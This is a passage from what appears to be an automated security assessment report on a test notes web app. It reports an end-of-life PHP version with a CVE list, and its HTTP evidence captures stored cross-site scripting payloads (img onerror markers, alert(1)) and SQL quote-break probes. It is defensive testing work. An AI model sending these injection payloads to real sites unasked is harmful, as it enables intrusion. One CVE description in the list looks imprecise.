                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictSQL\'&quot;`--</h3></td>
                            </tr>
                            <tr>
                                <td><p>sqlquote</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
```

<a id="finding-3"></a>

### 3. [MEDIUM] [vulnerable-component] End-of-life PHP 7.1.33 — unsupported since 2019-12-01, multiple unpatched post-EOL CVEs

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32873/

The application runs on PHP 7.1.33, disclosed via the `X-Powered-By: PHP/7.1.33` response header. This is a VERSION-BASED finding (banner-matched, not exploited).

7.1.33 is the FINAL release of the PHP 7.1 branch, which reached end-of-life on 2019-12-01. It has received NO security patches for ~6.5 years, so every vulnerability fixed in 7.2+ after that date remains unpatched here. Confirmed-applicable post-EOL CVEs that were fixed in later branches but never backported to 7.1:
- CVE-2020-7059 — out-of-bounds read in php_oci / similar (DoS / info leak).
- CVE-2020-7060 — out-of-bounds read in mb_strtolower() with crafted multibyte input.
- CVE-2020-7064 — out-of-bounds read in exif_read_data() (info leak).
- CVE-2020-7066 — get_headers() truncation on NUL byte → requests sent to an unintended host (SSRF/info-leak aid).
- CVE-2021-21702 — SoapClient NULL-pointer dereference → DoS.
These are predominantly memory-safety / DoS / info-leak issues (severity medium); there is no confirmed default-config unauthenticated RCE in 7.1.33 itself. NOTE: CVE-2019-11043 (PHP-FPM RCE) was actually FIXED in 7.1.33, so it does NOT apply. The core risk is running a wholly unsupported runtime that will never receive fixes for future PHP vulnerabilities.

Remediation: migrate to a supported PHP branch (8.2+) and set `expose_php = Off` to suppress the X-Powered-By banner.

**Reproduction**

```
1. GET http://target.local:32873/index.php and inspect response headers → `X-Powered-By: PHP/7.1.33` (ev-mqz72yer-5k, 200/27470 bytes). 2. Reproduced identically on / (ev-mqz72xst-5j, 200/27470 bytes). 3. Negative control: GET /verdict-nonexistent-path-404-check → Apache-handled 404 with NO X-Powered-By header (ev-mqz7301p-5m, 404/279 bytes). Map 7.1.33 → EOL 2019-12-01 and the unpatched CVEs above.
```

**Evidence**

- Evidence `ev-mqz7301p-5m` — `artifacts/_/ev-mqz7301p-5m/`

Request:

```http
GET /verdict-nonexistent-path-404-check HTTP/1.1
Host: target.local:32873
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 279
content-type: text/html; charset=iso-8859-1
date: Mon, 29 Jun 2026 12:29:24 GMT
keep-alive: timeout=5, max=97
server: Apache/2.4.38 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at target.local Port 32873</address>
</body></html>
```

- Evidence `ev-mqz72yer-5k` — `artifacts/_/ev-mqz72yer-5k/`

Request:

```http
GET /index.php HTTP/1.1
Host: target.local:32873
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response (truncated):

```http
HTTP/1.1 200
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-length: 27470
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 12:29:22 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=99
pragma: no-cache
server: Apache/2.4.38 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.1.33

<!doctype html>
<html>
    <head>
      <title>Simple Notes</title>
      <link rel="stylesheet" href="static/styles.css">
      <link rel="icon" href="static/favicon.ico" type="image/x-icon">
    </head>
    <body>
        &nbsp;</br>
        <div class="center blue">
                        <table>
                <tr>
                    <td width="90%"><h1>Welcome test</h1></td>
                    <td text-align="right"><a class="button" href="logout.php">Logout</a></td>
                </tr>
            </table>
        </div>
                                &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-testfile</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-content-marker</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xss-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdictstoXmqz5ngu6676vsafe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xss-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz5ngu6676v\'&quot;&gt;</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>Zmark9h3</h3></td>
                            </tr>
                            <tr>
                                <td><p>&lt;img src=x onerror=alert(1)&gt;Zmark9body</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xss-probe2</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdictstoXmqz5pnlnesg7safe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xss-probe2</h3></td>
                            </tr>
                            <tr>
                                <td><p>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz5pnlnesg7\'&quot;&gt;</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictstoXmqz5pw4hjk7lsafe</h3></td>
                            </tr>
                            <tr>
                                <td><p>titlexsstest</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz5pw4hjk7l\'&quot;&gt;</h3></td>
                            </tr>
                            <tr>
                                <td><p>titlexsstest</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>csrf-test</h3></td>
                            </tr>
                            <tr>
                                <td><p>csrf-test</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>csrf-test</h3></td>
                            </tr>
                            <tr>
                                <td><p>csrf-test</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>sqltest\'&quot;</h3></td>
                            </tr>
                            <tr>
                                <td><p>sqltestbody</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xsstitle</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdictstoXmqz5wu4ogxiusafe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xsstitle</h3></td>
                            </tr>
                            <tr>
                                <td><p>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz5wu4ogxiu\'&quot;&gt;</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictstoXmqz5xl18ahhgsafe</h3></td>
                            </tr>
                            <tr>
                                <td><p>xssbody</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz5xl18ahhg\'&quot;&gt;</h3></td>
                            </tr>
                            <tr>
                                <td><p>xssbody</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictsqli\'</h3></td>
                            </tr>
                            <tr>
                                <td><p>probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-sx</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdictstoXmqz60yqs3hdzsafe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-sx</h3></td>
                            </tr>
                            <tr>
                                <td><p>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz60yqs3hdz\'&quot;&gt;</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictstoXmqz62ee74q67safe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-title-sink</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz62ee74q67\'&quot;&gt;</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-title-sink</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>csrf-test</h3></td>
                            </tr>
                            <tr>
                                <td><p>csrf-test-body</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>csrf-test</h3></td>
                            </tr>
                            <tr>
                                <td><p>csrf-test-body</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictSQLbase</h3></td>
                            </tr>
                            <tr>
                                <td><p>sqlbaseline</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictSQL\'&quot;`--</h3></td>
                            </tr>
                            <tr>
                                <td><p>sqlquote</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
```

- Evidence `ev-mqz72xst-5j` — `artifacts/_/ev-mqz72xst-5j/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32873
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response (truncated):

```http
HTTP/1.1 200
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-length: 27470
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 12:29:21 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.38 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.1.33

<!doctype html>
<html>
    <head>
      <title>Simple Notes</title>
      <link rel="stylesheet" href="static/styles.css">
      <link rel="icon" href="static/favicon.ico" type="image/x-icon">
    </head>
    <body>
        &nbsp;</br>
        <div class="center blue">
                        <table>
                <tr>
                    <td width="90%"><h1>Welcome test</h1></td>
                    <td text-align="right"><a class="button" href="logout.php">Logout</a></td>
                </tr>
            </table>
        </div>
                                &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-testfile</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-content-marker</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xss-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdictstoXmqz5ngu6676vsafe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xss-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz5ngu6676v\'&quot;&gt;</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>Zmark9h3</h3></td>
                            </tr>
                            <tr>
                                <td><p>&lt;img src=x onerror=alert(1)&gt;Zmark9body</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xss-probe2</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdictstoXmqz5pnlnesg7safe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xss-probe2</h3></td>
                            </tr>
                            <tr>
                                <td><p>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz5pnlnesg7\'&quot;&gt;</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictstoXmqz5pw4hjk7lsafe</h3></td>
                            </tr>
                            <tr>
                                <td><p>titlexsstest</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz5pw4hjk7l\'&quot;&gt;</h3></td>
                            </tr>
                            <tr>
                                <td><p>titlexsstest</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>csrf-test</h3></td>
                            </tr>
                            <tr>
                                <td><p>csrf-test</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>csrf-test</h3></td>
                            </tr>
                            <tr>
                                <td><p>csrf-test</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>sqltest\'&quot;</h3></td>
                            </tr>
                            <tr>
                                <td><p>sqltestbody</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xsstitle</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdictstoXmqz5wu4ogxiusafe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xsstitle</h3></td>
                            </tr>
                            <tr>
                                <td><p>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz5wu4ogxiu\'&quot;&gt;</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictstoXmqz5xl18ahhgsafe</h3></td>
                            </tr>
                            <tr>
                                <td><p>xssbody</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz5xl18ahhg\'&quot;&gt;</h3></td>
                            </tr>
                            <tr>
                                <td><p>xssbody</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictsqli\'</h3></td>
                            </tr>
                            <tr>
                                <td><p>probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-sx</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdictstoXmqz60yqs3hdzsafe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-sx</h3></td>
                            </tr>
                            <tr>
                                <td><p>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz60yqs3hdz\'&quot;&gt;</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictstoXmqz62ee74q67safe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-title-sink</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz62ee74q67\'&quot;&gt;</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-title-sink</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>csrf-test</h3></td>
                            </tr>
                            <tr>
                                <td><p>csrf-test-body</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>csrf-test</h3></td>
                            </tr>
                            <tr>
                                <td><p>csrf-test-body</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictSQLbase</h3></td>
                            </tr>
                            <tr>
                                <td><p>sqlbaseline</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictSQL\'&quot;`--</h3></td>
                            </tr>
                            <tr>
                                <td><p>sqlquote</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
```
